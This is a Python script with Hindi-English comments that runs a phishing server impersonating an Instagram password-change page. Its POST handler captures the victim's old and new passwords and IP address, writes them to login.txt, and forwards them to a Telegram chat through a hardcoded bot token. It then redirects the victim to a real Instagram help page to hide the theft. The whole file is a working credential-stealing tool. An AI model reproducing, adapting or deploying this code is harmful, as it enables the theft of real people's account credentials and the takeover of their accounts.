from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
import datetime
import os
import subprocess
import sys
import time
import telebot  # pip install pyTelegramBotAPI
import socket

# === CONFIGURATION ===
# HOST: Server kis IP address par chalega.
# '0.0.0.0' ka matlab hai ki server sabhi available network interfaces par sunega,
# taaki cloudflared jaise tools isse connect kar saken.
HOST = '127.0.0.1'
PORT = 5054 # Server ab 5054 port par chalega

# TELEGRAM_BOT_TOKEN: Apne Telegram bot ka token yahan daalen
# TELEGRAM_CHAT_ID: Woh chat ID jahan aap messages receive karna chahte hain
TELEGRAM_BOT_TOKEN = "5154193675:AAE2sU4FJe_RLIHopHxFD2799pgR9XTi80U" # Ise apne bot token se badlen
TELEGRAM_CHAT_ID = "5071094116" # Ise apni chat ID se badlen

# CURRENT_DIR: Script jis directory mein hai, uska path
CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
# INDEX_PATH: HTML file ka path (index.html is script ke saath hona chahiye)
INDEX_PATH = os.path.join(CURRENT_DIR, 'index.html')
# LOG_PATH: Jahan captured data save hoga (ab 'login.txt' mein)
LOG_PATH = os.path.join(CURRENT_DIR, 'login.txt') # Filename 'log.txt' se 'login.txt' mein badla gaya hai

# Telegram bot ko initialize karna
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

def kill_existing_process_on_port(port):
    """
    Diye gaye port par chal rahe kisi bhi process ko kill karta hai.
    Linux/Unix systems par 'fuser' command ka upyog karta hai.
    Windows par yeh function kaam nahi karega.
    """
    try:
        # 'fuser' command ka upyog karke port par chal rahe processes ko dhoondhna
        result = subprocess.run(["fuser", f"{port}/tcp"], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
        output = result.stdout.decode().strip()
        if output:
            # Agar koi process mila, to unki PIDs nikalna
            pids = output.split()
            for pid in pids:
                # Har process ko kill karna (SIGKILL)
                os.kill(int(pid), 9)
            print(f"[!] Port {port} ka upyog karne wale process(es) ko kill kiya gaya: {' '.join(pids)}")
            time.sleep(1) # Thoda wait karna taaki port release ho jaye
    except FileNotFoundError:
        print("[!] 'fuser' command nahi mila. Yeh function Linux/Unix par hi kaam karta hai.")
    except Exception as e:
        print(f"[!] Port usage check karte samay error: {e}")

class SimpleHandler(BaseHTTPRequestHandler):
    """
    HTTP requests (GET aur POST) ko handle karne ke liye custom handler.
    """
    def get_client_ip(self):
        """
        Client ka asli IP address nikalta hai, X-Forwarded-For header ko bhi check karta hai.
        """
        # Agar request kisi proxy ya load balancer se aa rahi hai,
        # to asli client IP 'X-Forwarded-For' header mein ho sakta hai.
        forwarded_for = self.headers.get('X-Forwarded-For')
        if forwarded_for:
            # Agar multiple IP hain (comma separated), to pehla wala asli IP hota hai
            ip = forwarded_for.split(',')[0].strip()
        else:
            # Agar koi proxy nahi hai, to direct client address se IP lena
            ip = self.client_address[0]
        return ip

    def do_GET(self):
        """
        GET requests ko handle karta hai (jab browser page load karta hai).
        """
        # Agar path '/' ya '/index.html' hai, to index.html file serve karna
        if self.path == '/' or self.path == '/index.html':
            try:
                # index.html file ko binary mode mein padhna
                with open(INDEX_PATH, 'rb') as f:
                    content = f.read()
                # HTTP 200 OK response bhejna
                self.send_response(200)
                # Content-Type header set karna taaki browser use HTML samajh sake
                self.send_header('Content-Type', 'text/html')
                self.end_headers() # Headers ko end karna
                self.wfile.write(content) # HTML content browser ko bhejna
            except FileNotFoundError:
                # Agar index.html nahi mila
                print(f"[!] Error: {INDEX_PATH} file nahi mila.")
                self.send_error(404, '404 Not Found: index.html missing')
        else:
            # Agar koi aur path request kiya gaya, to 404 Not Found bhejna
            self.send_error(404, '404 Not Found')

    def do_POST(self):
        """
        POST requests ko handle karta hai (jab form submit hota hai).
        """
        # Request body ki length nikalna
        length = int(self.headers.get('Content-Length', 0))
        # Request body ko padhna aur UTF-8 mein decode karna
        post_data = self.rfile.read(length).decode('utf-8')
        # URL-encoded data ko parse karna (key-value pairs mein badalna)
        data = urllib.parse.parse_qs(post_data)

        # Form fields se password values nikalna
        old_pw = data.get('old-password', [''])[0]
        new_pw = data.get('new-password', [''])[0]
        confirm_pw = data.get('confirm-password', [''])[0]

        # Client ka IP address aur current date/time nikalna
        ip = self.get_client_ip()
        now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        # Log entry banana
        log_entry = (
            f"Instagram:\n" # Log file aur Telegram ke liye "Instagram" string
            f"Date & Time: {now}\n"
            f"IP Address: {ip}\n"
            f"Old Password: {old_pw}\n"
            f"New Password: {new_pw}\n"
            f"Confirm Password: {confirm_pw}\n"
            f"{'-' * 22}\n\n"
        )

        # Data ko log file mein save karna
        try:
            with open(LOG_PATH, 'a') as f:
                f.write(log_entry)
            print(f"[+] Credentials login.txt mein save ho gaye: {ip}") # Print message update kiya
        except Exception as e:
            print(f"[!] Log file mein likhne mein error: {e}")

        # Data ko Telegram bot par bhejna
        try:
            bot.send_message(
                TELEGRAM_CHAT_ID,
                f"Instagram:\n\nDate & Time: {now}\nIP Address: {ip}\nOld Password: {old_pw}\nNew Password: {new_pw}\nConfirm Password: {confirm_pw}"
            )
            print(f"[+] Credentials Telegram par bhej diye gaye: {ip}")
        except Exception as e:
            print(f"[!] Telegram par message bhejte samay error: {e}")

        # User ko Google par redirect karna
        self.send_response(302) # 302 Found (temporary redirect)
        self.send_header('Location', 'https://help.instagram.com/581066165581870/') # Redirect URL
        self.end_headers() # Headers ko end karna

class ReusableHTTPServer(HTTPServer):
    """
    Ek custom HTTP server jo 'SO_REUSEADDR' option enable karta hai.
    Yeh server ko turant restart karne mein madad karta hai agar woh pehle band hua ho.
    """
    def server_bind(self):
        # Socket option set karna taaki port turant reuse ho sake
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        super().server_bind() # Parent class ke bind method ko call karna

if __name__ == "__main__":
    # Script chalne se pehle checks
    if not os.path.isfile(INDEX_PATH):
        print(f"[!] Error: {INDEX_PATH} file nahi mila. Kripya 'index.html' ko script ke saath rakhen.")
        sys.exit(1) # Exit agar index.html nahi mila

    # Port par chal rahe kisi bhi existing process ko kill karna
    # (Yeh step Windows par kaam nahi karega)
    kill_existing_process_on_port(PORT)

    # Server shuru karne ka message print karna
    print(f"[+] Server chal raha hai http://{HOST}:{PORT} par")
    # HTTP server instance banana
    server = ReusableHTTPServer((HOST, PORT), SimpleHandler)
    try:
        # Server ko hamesha chalate rehna
        server.serve_forever()
    except KeyboardInterrupt:
        # Ctrl+C dabane par server ko band karna
        print("\n[+] Server band kiya ja raha hai...")
        server.server_close() # Server socket ko close karna

